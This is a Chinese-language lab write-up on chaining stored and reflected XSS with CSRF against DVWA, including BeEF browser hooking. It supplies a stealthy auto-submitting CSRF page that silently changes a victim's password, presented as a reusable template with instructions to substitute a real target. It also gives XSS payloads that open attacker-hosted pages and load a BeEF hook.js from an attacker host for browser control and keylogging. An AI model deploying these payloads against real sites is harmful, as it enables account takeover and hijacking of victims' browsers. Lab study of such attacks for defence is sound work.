# XSS+CSRF组合打法


XSS+CSRF组合打法

<!--more-->

# XSS+CSRF组合打法

看了一位大佬的复现笔记，自己也做了一下。

靶场平台是DVWA，服务器都是挂在本地。

这种攻击手法需要在Security Level为low的等级下进行

## 存储型 XSS + CSRF

### 1.构造poc

#### 首先构造CSRF代码

使用CSRFTester工具生成 POC，比使用 BurpSuite 生成的 POC 更加隐蔽，受害者打开该 POC 后，浏览器会自动执行代码随后跳转到正常页面，中途不需要用户交互，也不用像 BurpSuite 生成的 POC 那样还需要受害者手动点击按钮。

使用CSRFTester抓取流量有几个要点：

- 浏览器代理端口为8008
- CSRFTester会屏蔽127.0.0.1的流量，建议在hosts文件里添加规则`127.0.0.1  www.test.com`

打开 DVWA 的 CSRF 模块，开启CSRFTester的流量记录功能，输入密码后，点击change

![image-20230513192530675](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513192530675.png)

![image-20230513192440010](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513192440010.png)

之后 CSRFTester 就会抓取到修改密码的数据包，在 Form Parameters 中将左侧 Query Parameters 数据修改复制即可

> 值得注意的是 Display in Browers 选项是默认勾选的，这里建议根据自己情况而定。因为这个工具自动生成的代码在我这边是需要手动修改才能利用的，所以我这边选择取消勾选。

![image-20230513192759865](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513192759865.png)

之后点击 Generate HTML，选择保存的位置后，手动进行修改即可，当然如果工具生成的代码可以正常使用，就不需要修改了。

对于代码的修改，我主要是将 head、H2标题的内容删除了，以增加隐蔽性。**同时增加了倒数第 4 行的代码，因为没有这一句，这个 POC 是不能正常使用的**，最后修改后的 CSRF POC 代码如下。

```
<html>
<body onload="javascript:fireForms()">
<script language="JavaScript">
var pauses = new Array( "42" );
function pausecomp(millis){
    var date = new Date();
    var curDate = null;
    do { curDate = new Date(); }
    while(curDate-date < millis);}
function fireForms(){
    var count = 1;
    var i=0;
    for(i=0; i<count; i++){
        document.forms[i].submit();
        pausecomp(pauses[i]);}}
</script>
<form method="GET" name="form0" action="http://192.168.38.132:80/dvwa/vulnerabilities/csrf/?password_new=12345678&password_conf=12345678&Change=Change">
<input type="hidden" name="password_new" value="123123"/>
<input type="hidden" name="password_conf" value="123123"/>
<input type="hidden" name="Change" value="Change" />
</form>
</body>
</html>
```

可以直接套用这个模板，但使用的时候记得把192.168.38.132换成被攻击网站的域名或IP

同时，通过CSRFTester导出的原始数据如下，可以对比一下：

```
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">

<html>
<head>
<title>OWASP CRSFTester Demonstration</title>
</head>

<body onload="javascript:fireForms()">
<script language="JavaScript">
var pauses = new Array( "17","23" );

function pausecomp(millis)
{
    var date = new Date();
    var curDate = null;

    do { curDate = new Date(); }
    while(curDate-date < millis);
}

function fireForms()
{
    var count = 2;
    var i=0;
    
    for(i=0; i<count; i++)
    {
        document.forms[i].submit();
        
        pausecomp(pauses[i]);
    }
}
    
</script>
<H2>OWASP CRSFTester Demonstration</H2>
<form method="GET" name="form0" action="http://www.test.com:80/DVWA/vulnerabilities/csrf/?password_current=111&password_new=111&password_conf=111&Change=Change&user_token=c2458bf983aa09631d2abcb07e0f9849">
<input type="hidden" name="name" value="value"/> 
</form>
</body>
</html>
```



#### 随后构造XSS代码

```
<script src="x" onerror=javascript:window.open("http://192.168.38.1/csrf.html")></script>
```

根据需要进行修改

### 2.进行xss攻击

在 XSS (Stored) 模块下，插入 XSS 代码

在 DVWA 中会碰到 POC 太长而无法输入完全的情况，这个时候在开发者工具中将这个框的 maxlength 值设置大一点即可，这里我设置了 500.

![image-20230513193346598](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513193346598.png)

点击 sign guestbook 按钮，POC 就会被插进去了，之后用其他浏览器登陆其他用户，访问存储型 XSS 模块页面，就会触发xss

![image-20230513193412149](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513193412149.png)

访问页面后，浏览器会自动跳转，同时返回修改密码的界面，如果弹出页面显示如上图中的 Password Changed 字样，就说明受害者的密码修改成功了，而这也仅仅是因为受害者点击了一个页面。

## CSRF + SelfXSS

​	在这套组合打法中，用到了BeFF工具：		

​	BeFF:The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 用Ruby语言开发的，Kali中默认安装的一个模块，用于实现对XSS漏洞的攻击和利用。

​	BeEF主要是往网页中插入一段名为hook.js的JS脚本代码，如果浏览器访问了有hook.js(钩子)的页面，就会被hook(勾住)，勾连的浏览器会执行初始代码返回一些信息，接着目标主机会每隔一段时间（默认为1秒）就会向BeEF服务器发送一个请求，询问是否有新的代码需要执行。BeEF服务器本质上就像一个Web应用，被分为前端和后端。前端会轮询后端是否有新的数据需要更新，同时前端也可以向后端发送指示， BeEF持有者可以通过浏览器来登录 BeEF 的后端，来控制前端(用户的浏览器)。BeEF一般和XSS漏洞结合使用。

### 安装：

一般是安装在linux系统里的

```
sudo apt-get install beef-xss
```

随后可运行

```
sudo beef-xss
```

![image-20230513223419188](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513223419188.png)

随后可以看到我们的钩子js代码
![image-20230513223448143](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513223448143.png)

ip需要自行修改为主机ip，钓鱼页面(被攻击页面)是因为插入了一下js脚本：

```
Js脚本： <script src="http://192.168.3.59:3000/hook.js"></script>
目标打开带有js脚本的文件后
然后beef中会看到被害者上线，可以进行控制，可以记录键盘输入
```

相关的配置文件在目录：`/usr/share/beef-xss/`下的config.yaml中

### 实操：

浏览器输入http://192.168.3.59:3000/demos/butcher/index.html打开默认测试页面

![image-20230513222643172](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513222643172.png)

随后进入http://192.168.3.59:3000/ui/panel页面，就会看到自己被上线

![image-20230513222608120](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513222608120.png)



### 模块命令的使用和模块的作用种类：

**Broser：**主要是针对浏览器的一些信息收集或攻击，其下的子选项卡Hooked Domain主要是获取HTTP属性值，比如cookie、表单值等，还可以做写简单的浏览器操作，比如替换href值，弹出警告框，重定向浏览器等。这个选项卡下的有些模块会根据受害者的浏览器来决定是否显示。主要是浏览器通用操作和其他基本信息检测。
**Chrome extensions：**主要是针对谷歌浏览器扩展插件
**Debug：**调试功能
**Exploits：**漏洞利用，主要利用一些已公开的漏洞进行攻击测试
**Host：**针对主机，比如检测主机的浏览器、系统信息、IP地址、安装软件等等
**IPEC：**协议间通信。主要是用来连接、控制受害者浏览器的
**Metasploit：**Beef可通过配置和metasploit平台联合，一旦有受害者出现，可通过信息收集确定是否存在漏洞，进一步方便metasploit攻击测试
**Misc：**杂项。
**Network：**网络扫描
**Persistence：**维护受害者访问
**Phonegap：**手机测试
**Social engineering：**社会工程学攻击

其中：
绿色模块：可以执行且目标不可见
红色模块：不适合当前目标
橙色模块：可以执行但目标可见
灰色模块：未在目标浏览器上测试过

**比如，**可以使目标主机浏览器发出某种音频

![image-20230513223033972](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513223033972.png)





### 1.构造 POC

#### 首先构造XSS代码

```
<script src="http://192.168.38.129:3000/hook.js"></script>
```

#### 构造 CSRF 代码

 CSRFTester 工具生成 CSRF POC。

![image-20230513231350134](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513231350134.png)

修改之后的poc

```
<html>
<body onload="javascript:fireForms()">
<script language="JavaScript">
var pauses = new Array( "54" );
function pausecomp(millis){
    var date = new Date();
    var curDate = null;
    do { curDate = new Date(); }
    while(curDate-date < millis);}
function fireForms(){
    var count = 1;
    var i=0;
    for(i=0; i<count; i++){
    	document.forms[i].submit(); 
        pausecomp(pauses[i]);}}   
</script>
<form method="GET" name="form0" action="http://192.168.38.132:80/dvwa/vulnerabilities/xss_r/?name=<script src='http://192.168.38.129:3000/hook.js'></script>">
<input type="hidden" name="name" value="<script src='http://192.168.38.129:3000/hook.js'></script>"/> 
</form>
</body>
</html>
```

将上面代码放到本地 Web 服务中，打开其他浏览器，登陆其他账户，再打开我们构造的 CSRF 链接。

```
http://192.168.38.1/csrf.html
```

### 2.beef上线

打开链接后，beef 中就能看到上线的主机了。

![image-20230513231503640](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20230513231503640.png)

这个组合打法是需要诱导受害者点击构造的 CSRF 链接的，利用难度要高于第一个组合
